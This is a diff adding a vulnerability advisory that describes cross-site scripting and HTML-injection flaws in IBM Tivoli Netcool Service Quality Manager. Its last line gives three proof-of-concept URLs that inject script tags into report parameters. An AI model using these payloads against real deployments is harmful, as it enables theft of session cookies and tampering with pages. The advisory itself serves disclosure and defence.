@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/32233/info
+
+IBM Tivoli Netcool Service Quality Manager is prone to multiple cross-site scripting and an HTML-injection vulnerability because it fails to sufficiently sanitize user-supplied data.
+
+Attacker-supplied HTML or JavaScript code could run in the context of the affected site, potentially allowing the attacker to steal cookie-based authentication credentials and to control how the site is rendered to the user; other attacks are also possible.
+
+We don't know which versions of IBM Tivoli Netcool Service Quality Manager are affected. We will update this BID when more details emerge.
+
+NOTE: IBM Tivoli Netcool Service Quality Manager may also have been known as 'Vallent Metrica Service Assurance'. 
+
+http://www.example.com/<document root>/ReportTree?action=generatedreportresults&elementid="><SCRIPT>alert("Non persistant XSS");</SCRIPT><!--&date=0000000000000 http://www.example.com/<document root>/Launch?jnlpname=="><SCRIPT>alert("Non Persistant XSS");</SCRIPT> http://www.example.com/<document_root>/ReportRequest?dateformat=dd%2FMM%2Fyyyy&reporttitle=some_title&reportID=some_stuff&version=0&treesrc=&treetitle=&p_wstring=&p_dataperiod =none%3A%23%3Araw&startdate=01%2F01%2F2008&reporttype=offline&%3Atasklabel=<SCRIPT>alert(Persistant XSS!);</SCRIPT>&none_agg_specified=false&windowtype=main 
